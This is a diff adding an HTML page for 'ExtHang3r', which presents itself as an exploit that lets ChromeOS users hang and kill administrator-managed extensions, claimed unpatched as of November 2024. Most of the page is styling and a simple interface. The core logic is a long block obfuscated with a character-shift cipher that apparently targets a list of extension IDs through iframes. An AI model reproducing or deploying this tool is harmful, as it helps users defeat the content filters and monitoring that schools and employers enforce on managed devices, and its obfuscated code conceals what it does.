@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ExtHang3r</title>
+  <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/main/favicon.png">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
+  <style>
+    body {
+      font-family: 'Varela Round', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f8f9fa;
+      color: #333;
+    }
+    header {
+      background-color: #343a40;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin-right: 10px;
+    }
+    .container {
+      max-width: 800px;
+      margin: 150px auto 0 auto;
+      padding: 20px;
+      text-align: center;
+      background: #fff;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+    select {
+      font-family: 'Varela Round', sans-serif;
+      margin-bottom: 10px;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ced4da;
+      border-radius: 4px;
+      width: 100%;
+    }
+    button {
+      font-family: 'Varela Round', sans-serif;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      color: #fff;
+      font-size: 24px;
+      user-select: none;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #killExtensionText {
+      display: none;
+      margin-top: 20px;
+      color: #333;
+      font-size: 18px;
+      text-align: center;
+      background: #e9ecef;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+   	 #killButton {
+	  display: none;
+	  background-color: #dc3545;
+	  color: #fff;
+	  border: none;
+	  padding: 10px 20px;
+	  font-size: 16px;
+	  cursor: pointer;
+	  border-radius: 5px;
+ 	  transition: background-color 0.3s ease;
+	}
+
+	#killButton:hover {
+	  background-color: #9c1c28;
+	}
+    footer {
+      background-color: #343a40;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+    footer a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://blobby-boi.github.io/BlobbypassXSS/favicon.png" alt="Logo" class="logo">
+  <h1>ExtHang3r</h1>
+</header>
+
+<div class="container">
+  <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of November 2024.</p>
+  <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
+  <select id="iframeSelect">
+  </select>
+  <button onclick="warning();" id="hangButton">Hang Extension!</button>
+  <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  Hanging... (This will take about 1 minute)
+</div>
+<div id="killExtensionText"></div>
+
+<footer>
+  <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a></p>
+</footer>
+
+<script>
+function o(n, _ = 78, D = 126) {
+    for (var x = n.toString().split(""), $ = 0; $ < x.length; $++) x[$].charCodeAt(0) <= D && (x[$] = String.fromCharCode((x[$].charCodeAt(0) + _) % D));
+    return x.join("")
+}
+
+function d(n, _ = 78, D = 126) {
+    return o(n, D - _)
+}
+d`1CI>3n6E>3D9?>n3853;HD5>C9?>%"vEB<wnKXnnnnDBInKXnnnnnn3?>CDnB5C@?>C5n
+n1G19Dn65D38vEB<wXnnnnnn96nvB5C@?>C5|?;wnKXnnnnnnnnB5DEB>nDBE5XnnnnnnMn5<C5nKXnnnnnnnnB5DEB>n61<C5XnnnnnnMXnnnnMn31D38nv5BB?BwnKXnnnnnnB5DEB>n61<C5XnnnnMXnnMXXnn1CI>3n6E>3D9?>n@?@E<1D5#5<53D@D9?>CvwnKXnnnn3?>CDnC5<53D<5=5>Dn
+n4?3E=5>D|75D<5=5>DI4vp96B1=5#5<53DpwXnnnn3?>CDn5HD5>C9?>Cn
+nKXnnnnnnp#53EB<Ip
+np38B?=5{5HD5>C9?>
+}}:?6<=;3392;??@<15?9>53:2=4527<12}6?>DC}5DB?@?<9C|3CCpzXnnnnnnp#53EB<Inv?<4wp
+np38B?=5{5HD5>C9?>
+}}985?217:;6;<><9;7981><8344:?98;7}6?>DC}5DB?@?<9C|3CCpzXnnnnnnp?E1B491>p
+np38B?=5{5HD5>C9?>
+}}81<4<7<4@<7>77;:11685<7917<161>8}I?EDE25/9>:53D9?>|:CpzXnnnnnnp#38??<p
+np38B?=5{5HD5>C9?>
+}}21<59?:>:@75?:?888629383?47<:=>:}2<?3;54|8D=<pzXnnnnnnp9>5G9J5p
+np38B?=5{5HD5>C9?>
+}}4462;8@=342395:5>63?<11952>:3263}213;7B?E>4}1CC5DC}@175C}4561E<D{2<?3;54|8D=<pzXnnnnnnp<?3;C9p
+np38B?=5{5HD5>C9?>
+}}78<@=<4=::8=47=>5?192257;::2?>2;}@175C}2<?3; 175|8D=<pzXnnnnnnp?BD9E1B4p
+np38B?=5{5HD5>C9?>
+}}9727@58>2=8747:28;;@54?==7=6251?}I?EDE25/9>:53D9?>|:CpzXnnnnnnp9C3?n%=2B5<<1p
+np38B?=5{5HD5>C9?>
+}}:348=?:653:6=24@3898259<?87>2439}2<?3;54|8D=<pzXnnnnnnp?>D5>D@5Bp
+np38B?=5{5HD5>C9?>
+}}:4?7@81;?>464=31>@1@618;4?=19361}9=7}3;1ED8	H|@>7pzXnnnnnnp{ED85>D931D?Bnp
+np38B?=5{5HD5>C9?>
+}}?4?1>@>?>9<?7?6771?88;4;47284<:@}9=7}3;1ED8	H|@>7pzXnnnnnnp#53EB<In<1CCB??=p
+np38B?=5{5HD5>C9?>
+}}:62536=9573:445>:8<28<9;326=>164}>?D6?E>4|8D=<pzXnnnnnnp1@1B1p
+np38B?=5{5HD5>C9?>
+}};2?8163?@6@97;:49=43475><8;=82>3}2<?3;54|8D=<pzXnnnnnnp1@1B1nv>5Gnwp
+np38B?=5{5HD5>C9?>
+}}135?@13715@435<?8?293@66225:>613}2<?3;54|8D=<pzXnnnnnnp92?CCp
+np38B?=5{5HD5>C9?>
+}};=6658294<1<9265;<156>3;@942?466}B5CDB93D54|8D=<pzXnnnnnnp978DC@554n979D1<n>C978Dn75>Dp
+np38B?=5{5HD5>C9?>
+}}>:4>93<7579:434<9;<795931>@=3>7:}:C}G1C=/5H53|:CpzXnnnnnnp978DC@554n9<D5Bn75>Dp
+np38B?=5{5HD5>C9?>
+}}14;3@;@7818=2?@;:38?2953;5?1?55=}93?>{|@>7pzXnnnnnnp978DC@554n<1CCB??=p
+np38B?=5{5HD5>C9?>
+}};;2=47:77341:3;4<2>74:?>@38@1951}1CC5DC}93?>{3<1CCB??={|@>7pzXnnnnnnp>D5B##n9<D5B9>7n#5BF935p
+np38B?=5{5HD5>C9?>
+}}:2447:7<7;;>5?>>9>51?84812:27?@9}@175C}=5CC175{@175|8D=<pzXnnnnnnp>D5B#165n1D5G1I?>>53D9?>n75>Dp
+np38B?=5{5HD5>C9?>
+}}53:?7833>:<?4:<=;7=>2>;432>:745>}B5C?EB35C}?@D9?>C|:CpzXnnnnnnp?9?n'52n9<D5BCp
+np38B?=5{5HD5>C9?>
+}}@12:<2:37<4>4>@:>?;:1;24?6:7>691}9=175}1<<?G/93?>}C895<4/7B55>/H|@>7pzXnnnnnnp?@85BnE44Ip
+np38B?=5{5HD5>C9?>
+}}37222:=74@>969:3?>81=77:58<1=396}9=175C}7?@85B{2E44I/H/3?<?B|@>7pzXnnnnnnp1>#38??<n'52n5<@5Bp
+np38B?=5{5HD5>C9?>
+}}8?>:3>565;6>?=@1=@3@=341492=:8<;}2<?3;54|8D=<pzXnnnnnnp$1J1BECp
+np38B?=5{5HD5>C9?>
+}}3797?@:1;;53<877387>8=@=87832>16}=?45<C}=?45<|:C?>pzXnnnnnnp=@5B?n13;4B?@p
+np38B?=5{5HD5>C9?>
+}}::@=:33@5=<<>=791?:1?37>1;@=67:7}<935>C5C|8D=<pzXnnnnnnp?29<5nE1B491>p
+np38B?=5{5HD5>C9?>
+}}67=1684?8:;4861137273<=67;7?;7=2}2<?3;|8D=<pzXnnnnnnp5D#E@@?BDn#38??<n#DE45>Dp
+np38B?=5{5HD5>C9?>
+}}73:@56866=37@<7;<66725271>=866:5}/<?31<5C}<D}=5CC175C|:C?>pzXnnnnMXnnnnXnnnn<5Dn81C#E@@?BD54HD5>C9?>Cn
+n61<C5XXnnnn6?Bnv3?>CDn+>1=5znEB<-n?6n2:53D|5>DB95Cv5HD5>C9?>CwwnKXnnnnnn96nv1G19Dn3853;HD5>C9?>%"vEB<wwnKXnnnnnnnn3?>CDn?@D9?>n
+n4?3E=5>D|3B51D5<5=5>Dvp?@D9?>pwXnnnnnnnn?@D9?>|F1<E5n
+nEB<Xnnnnnnnn?@D9?>|D5HD?>D5>Dn
+n>1=5XnnnnnnnnC5<53D<5=5>D|1@@5>489<4v?@D9?>wXnnnnnnnn81C#E@@?BD54HD5>C9?>Cn
+nDBE5XnnnnnnMXnnnnMXnnnnXnnnn96nvo81C#E@@?BD54HD5>C9?>CwnKXnnnnnn3?>CDn?@D9?>n
+n4?3E=5>D|3B51D5<5=5>Dvp?@D9?>pwXnnnnnn?@D9?>|F1<E5n
+nppXnnnnnn?@D9?>|D5HD?>D5>Dn
+np?nCE@@?BD54n5HD5>C9?>Cn9>CD1<<54pXnnnnnnC5<53D<5=5>D|1@@5>489<4v?@D9?>wXnnnnnn4?3E=5>D|75D<5=5>DI4vp81>7EDD?>pw|CDI<5|49C@<1In
+np>?>5pXnnnnMXnnMXXnn@?@E<1D5#5<53D@D9?>CvwXnnXnn6E>3D9?>nB5@<1356B1=5Cv3?>D19>5Bzn96B1=5#B3wnKXnnnn6?BnvF1Bn9n
+n n9nn   n9yywnKXnnnnnnF1Bn96B1=5n
+n4?3E=5>D|3B51D5<5=5>Dvu96B1=5uwXnnnnnn96B1=5|CB3n
+n96B1=5#B3Xnnnnnn96B1=5|CDI<5|G94D8n
+nu  suXnnnnnn96B1=5|CDI<5|85978Dn
+nu  @HuXnnnnnn3?>D19>5B|1@@5>489<4v96B1=5wXnnnnMXnnnnC5D$9=5?EDv6E>3D9?>vwnKXnnnnnnG89<5nv3?>D19>5B|69BCD89<4wnKXnnnnnnnn3?>D19>5B|B5=?F589<4v3?>D19>5B|69BCD89<4wXnnnnnnMXnnnnnnB5@<1356B1=5Cv3?>D19>5Bzn96B1=5#B3wXnnnnMznwXnnMXXnn6E>3D9?>nG1B>9>7vwnKXnnnnF1Bn?F5B<1In
+n4?3E=5>D|75D<5=5>DI4vp?F5B<1IpwXnnnn?F5B<1I|CDI<5|49C@<1In
+np6<5HpXnnnnF1Bn96B1=5#5<53Dn
+n4?3E=5>D|75D<5=5>DI4vp96B1=5#5<53DpwXnnnnF1BnC5<53D54@D9?>n
+n96B1=5#5<53D|?@D9?>C+96B1=5#5<53D|C5<53D54>45H-|D5HDXnnnnF1BnC5<53D54#B3n
+n96B1=5#5<53D|F1<E5XnnnnF1Bn@?@E@n
+nG9>4?G|?@5>vppznp ?@E@'9>4?GpznpG94D8
+  z85978D
+  pwXnnnnF1Bn@?@E@?3E=5>Dn
+n@?@E@|4?3E=5>DXnnnnF1Bn@?@E@?4In
+n@?@E@?3E=5>D|2?4IXnnnnF1Bn96B1=5?>D19>5Bn
+n@?@E@?3E=5>D|3B51D5<5=5>Dvu49FuwXnnnn96B1=5?>D19>5B|94n
+nu96B1=5?>D19>5BuXnnnn@?@E@?4I|1@@5>489<4v96B1=5?>D19>5BwXnnnnB5@<1356B1=5Cv96B1=5?>D19>5BznC5<53D54#B3wXnnnnC5D$9=5?EDv6E>3D9?>vwnKXnnnnnn@?@E@|3<?C5vwXnnnnnnF1Bn5HD5>C9?>4n
+nC5<53D54#B3|CE2CDB9>7vC5<53D54#B3|9>45H6vp}}pwnynznC5<53D54#B3|9>45H6vp}pznC5<53D54#B3|9>45H6vp}}pwnynwwXnnnnnnF1Bn5HD5>C9?>%"n
+np38B?=5{5HD5>C9?>
+}}pnyn5HD5>C9?>4XnnnnnnF1Bn;9<<HD5>C9?>$5HDn
+n4?3E=5>D|75D<5=5>DI4vp;9<<HD5>C9?>$5HDpwXnnnnnn;9<<HD5>C9?>$5HD|9>>5B$n
+np?GnD81DnD85n5HD5>C9?>nCDB?>7pnynC5<53D54@D9?>nynp}CDB?>7n81Cn255>n81>754zn@B5CCnD85n2EDD?>n12?F5|pXnnnnnnC5D$9=5?EDv6E>3D9?>vwnKXnnnnnnnn?F5B<1I|CDI<5|49C@<1In
+np>?>5pXnnnnnnnn;9<<HD5>C9?>$5HD|CDI<5|49C@<1In
+np2<?3;pXnnnnnnnn4?3E=5>D|75D<5=5>DI4vp;9<<EDD?>pw|CDI<5|49C@<1In
+np9><9>5{2<?3;pXnnnnnnnn4?3E=5>D|75D<5=5>DI4vp81>7EDD?>pw|CDI<5|49C@<1In
+np>?>5pXW4?3E=5>D|75D<5=5>DI4vp96B1=5#5<53Dpw|CDI<5|49C@<1In
+np>?>5pXW4?3E=5>D|75D<5=5>DI4vp<125<?B6B1=5#5<53Dpw|CDI<5|49C@<1In
+np>?>5pXnnnnnnnn4?3E=5>D|75D<5=5>DI4vp;9<<EDD?>pw|C5DDDB92ED5vp41D1{EB<pznC5<53D54#B3wXnnnnnnMzn    wXnnnnMzn   wXnnMXXnn6E>3D9?>n?@5>HD5>C9?> ?@E@vwnKXnnnnF1BnC5<53D54#B3n
+n4?3E=5>D|75D<5=5>DI4vp;9<<EDD?>pw|75DDDB92ED5vp41D1{EB<pwXnnnnF1Bn5HD5>C9?>4n
+nC5<53D54#B3|CE2CDB9>7vC5<53D54#B3|9>45H6vp}}pwnynznC5<53D54#B3|9>45H6vp}pznC5<53D54#B3|9>45H6vp}}pwnynwwXnnnnF1Bn;9<<HD5>C9?>$5HDn
+n4?3E=5>D|75D<5=5>DI4vp;9<<HD5>C9?>$5HDpwXnnnn4?3E=5>D|75D<5=5>DI4vp;9<<EDD?>pw|CDI<5|49C@<1In
+np>?>5pXnnnn;9<<HD5>C9?>$5HD|9>>5B$n
+np1;5nCEB5nD?n;55@nD89CnD12n?@5>|n$85>n9>n1n>5GnD12n?@5>nCDB?>738B?=5
+}}5HD5>C9?>C}94
+pnyn5HD5>C9?>4nynp}CDB?>7n<9@nD85nCG9D38n31<<54n1<<?Gn1335CCnD?n69<5n%"CnDG935|n$85n5HD5>C9?>nG1CnCE335CC6E<<In;9<<54on?GnI?En31>n3<?C5nD81DnD12n1CnG5<<n1CnD89Cn?>5|n6nI?EnG1>DnD?nB5CD?B5nD85n5HD5>C9?>zn6<9@nD85n1<<?Gn1335CCnD?n69<5n%"CnCG9D38n1719>|pXnnnnG9>4?G|<?31D9?>|8B56n
+nC5<53D54#B3XnnM`
+
+</script>
+</body>
+</html>
